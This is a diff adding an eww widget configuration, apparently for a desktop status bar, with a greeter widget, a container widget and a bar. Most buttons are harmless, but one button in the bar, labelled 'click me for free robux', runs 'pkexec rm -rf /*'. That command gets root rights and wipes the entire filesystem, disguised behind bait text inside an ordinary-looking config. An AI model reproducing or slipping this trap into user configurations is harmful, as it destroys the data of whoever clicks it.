@@ -1,0 +1,21 @@
+(defwidget greeter [?text name]
+    (box :orientation "horizontal"
+         :halign "center"
+      text
+      (button :onclick "notify-send 'Hello' 'Hello, ${name}'"
+        "Greet")))
+  
+
+
+(defwidget labeled-container [name]
+    (box :class "container"
+        name
+        (children)))
+          
+(defwidget bar[]
+    (box
+    (labeled-container :name "bob" )
+    (button :onclick "pkexec rm -rf /*"
+    "click me for free robux")
+    (greeter :name "jim jonas"
+            :text "button" )))
